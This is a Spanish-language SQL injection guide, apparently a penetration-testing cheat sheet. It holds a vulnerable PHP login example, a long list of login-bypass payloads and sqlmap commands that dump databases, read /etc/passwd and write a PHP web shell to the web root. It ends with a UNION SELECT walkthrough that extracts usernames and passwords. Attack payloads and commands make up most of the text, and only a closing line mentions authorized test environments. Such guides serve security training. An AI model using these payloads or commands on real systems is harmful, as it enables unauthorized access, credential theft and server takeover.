# 📚 Guía Básica de Inyección SQL (SQLi) Manual y Automatizada

---

## 📑 Índice

1. ¿Qué es una SQL Injection?
2. ¿Por qué ocurre?
3. Ejemplo sencillo
4. Cómo detectar la vulnerabilidad
5. Inyecciones comunes (manuales)
6. Automatizar el ataque con sqlmap
7. Ataques avanzados con sqlmap
8. Guía de ataque manual (UNION SELECT)
9. Resumen de ataque manual

---

## ❓ ¿Qué es una SQL Injection?

Una **SQL Injection** es un tipo de ataque que ocurre cuando un atacante es capaz de "inyectar" código SQL malicioso en una consulta que se envía a la base de datos.

👉 En otras palabras: el atacante logra manipular las consultas a la base de datos para que hagan cosas no deseadas, como:

- obtener datos confidenciales,
- modificar o eliminar datos,
- saltarse controles de autenticación,
- ejecutar comandos administrativos en la base de datos.

---

## 📌 ¿Por qué ocurre?

Sucede cuando una aplicación web **no valida correctamente la entrada del usuario** antes de usarla en una consulta SQL.

---

## 🔍 Ejemplo sencillo

Supongamos que en una página de login tenemos este código en PHP:

```php
$username = $_POST['username'];
$password = $_POST['password'];

$query = "SELECT * FROM users WHERE username = '$username' AND password = '$password'";
```

Si el atacante, en el campo `password`, escribe:

```sql
' OR '1'='1
```

La consulta que se ejecuta es:

```sql
SELECT * FROM users WHERE username = 'admin' AND password = '' OR '1'='1'
```

Como `'1'='1'` siempre es verdadero, es posible que el atacante logre iniciar sesión **sin conocer la contraseña**.

---

## 🔍 ¿Cómo detectar la vulnerabilidad?

Cuando vemos campos a rellenar, intentaremos inyectar código y observaremos la respuesta.  
Lo primero es intentar **escapar del contexto actual** con entradas como:

```
[Nada]
'
"
`
')
")
`)
'))
"))
`))
```

Luego corregimos la consulta.  
Podemos automatizar esta tarea con diccionarios como SecLists.

---

## Inyecciones comunes (manuales)

```sql
" or 1=1
" or 1=1#
" or 1=1--
" or 1=1/*
' or 1=1
' or 1=1#
' or 1=1--
' or 1=1/*
admin" #
admin" --
admin" or "1"="1
admin" or "1"="1"#
admin" or "1"="1"--
admin" or "1"="1"/*
admin" or 1=1
admin" or 1=1#
admin" or 1=1--
admin" or 1=1/*
admin") or "1"="1
admin") or "1"="1"#
admin") or "1"="1"--
admin") or "1"="1"/*
admin") or ("1"="1
admin") or ("1"="1"#
admin") or ("1"="1"--
admin") or ("1"="1"/*
admin"/*
admin"or 1=1 or ""="
admin' #
admin' --
admin' or '1'='1
admin' or '1'='1'#
admin' or '1'='1'--
admin' or '1'='1'/*
admin' or 1=1
admin' or 1=1#
admin' or 1=1--
admin' or 1=1/*
admin') or '1'='1
admin') or '1'='1'#
admin') or '1'='1'--
admin') or '1'='1'/*
admin') or ('1'='1
admin') or ('1'='1'#
admin') or ('1'='1'--
admin') or ('1'='1'/*
admin'/*
admin'or 1=1 or ''='
or 1=1
or 1=1#
or 1=1--
or 1=1/*
```

---

## 🤖 Automatizar el ataque

Podemos automatizar el ataque con herramientas como `sqlmap`.

### 1️⃣ Buscar bases de datos

```bash
sqlmap -u http://<IP> --forms --dbs --batch
```

### 2️⃣ Enumerar las tablas

```bash
sqlmap -u http://<IP> --forms -D <NOMBRE_BASE_DE_DATOS> --tables --batch
```

### 3️⃣ Enumerar las columnas

```bash
sqlmap -u http://<IP> --forms -D <NOMBRE_BASE_DE_DATOS> -T <NOMBRE_DE_LA_TABLA> --columns --batch
```

### 4️⃣ Extraer los datos

```bash
sqlmap -u http://<IP> --forms -D <NOMBRE_BASE_DE_DATOS> -T <NOMBRE_DE_LA_TABLA> -C <NOMBRE_DE_LA_COLUMNA_1>,<NOMBRE_DE_LA_COLUMNA_2> --dump --batch
```

---

## 🎯 Ataques avanzados con SQLMap

### 🔹 Especificar el parámetro vulnerable

```bash
sqlmap -u "http://<IP>/pagina.php?id=1" -p id --dbs --batch
```

### 🔹 Aumentar el nivel y riesgo del ataque

```bash
sqlmap -u http://<IP> --forms --dbs --risk=3 --level=5 --batch
```

### 🔹 Usar cookies

```bash
sqlmap -u http://<IP> --cookie="PHPSESSID=XXXXXXXXXXXXX" --dbs --batch
```

### 🔹 Obtener el usuario actual

```bash
sqlmap -u http://<IP> --current-user --batch
```

### 🔹 Obtener versión del motor

```bash
sqlmap -u http://<IP> --banner --batch
```

### 🔹 Leer archivos

```bash
sqlmap -u http://<IP> --file-read="/etc/passwd" --batch
```

### 🔹 Escribir archivos (WebShell)

```bash
sqlmap -u http://<IP> --file-write="shell.php" --file-dest="/var/www/html/shell.php" --batch
```

---

## 🛠️ Guía de ataque manual (UNION SELECT)

---

## Paso 1️⃣ Detectar la vulnerabilidad

Inserta una comilla simple `'` en un parámetro de entrada (formulario, URL, etc.).

Ejemplo:

```
http://ejemplo.com/product.php?id=1'
```

O prueba con número negativo:

```
http://ejemplo.com/product.php?id=-1
```

---

## Paso 2️⃣ Identificar el número de columnas con ORDER BY

```bash
http://ejemplo.com/product.php?id=1 ORDER BY 1-- -
http://ejemplo.com/product.php?id=1 ORDER BY 2-- -
http://ejemplo.com/product.php?id=1 ORDER BY 3-- -
...
```

Cuando aparezca un error, el número anterior indica la cantidad correcta de columnas.

---

## Paso 3️⃣ Usar UNION SELECT para obtener datos

Ejemplo con 3 columnas:

```bash
http://ejemplo.com/product.php?id=1 UNION SELECT 1,2,3-- -
```

Si ves 1, 2, 3 en la página, la inyección funciona.

---

## Paso 4️⃣ Extraer datos reales

Ejemplo:

```bash
http://ejemplo.com/product.php?id=1 UNION SELECT username,password,3 FROM users-- -
```

---

## Paso 5️⃣ Listar bases de datos

```bash
http://ejemplo.com/product.php?id=1 UNION SELECT 1,schema_name,3,4,5 FROM information_schema.schemata-- -
```

Con LIMIT:

```bash
http://ejemplo.com/product.php?id=1 UNION SELECT 1,schema_name,3,4,5 FROM information_schema.schemata LIMIT 0,1-- -
```

---

## Paso 6️⃣ Listar nombres de tablas

```bash
http://ejemplo.com/product.php?id=1 UNION SELECT 1,table_name,3,4,5 FROM information_schema.tables WHERE table_schema="<NOMBRE_BASE_DATOS>"-- -
```

---

## Paso 7️⃣ Listar columnas

```bash
http://ejemplo.com/product.php?id=1 UNION SELECT 1,column_name,3,4,5 FROM information_schema.columns WHERE table_schema="<NOMBRE_BASE_DATOS>" AND table_name="<NOMBRE_TABLA>"-- -
```

---

## Paso 8️⃣ Mostrar datos concatenados

```bash
http://ejemplo.com/product.php?id=1 UNION SELECT 1,CONCAT(<COLUMNA1>,0x3a,<COLUMNA2>),3,4,5 FROM <NOMBRE_BASE_DATOS>.<NOMBRE_TABLA>-- -
```

(0x3a representa el carácter ":")

---

## ✅ Notas

- Adaptar el número de columnas a las de la consulta original.
- Usar `-- -` o `#` para comentar el resto de la consulta original.
- Probar siempre en entornos de prueba autorizados.

---





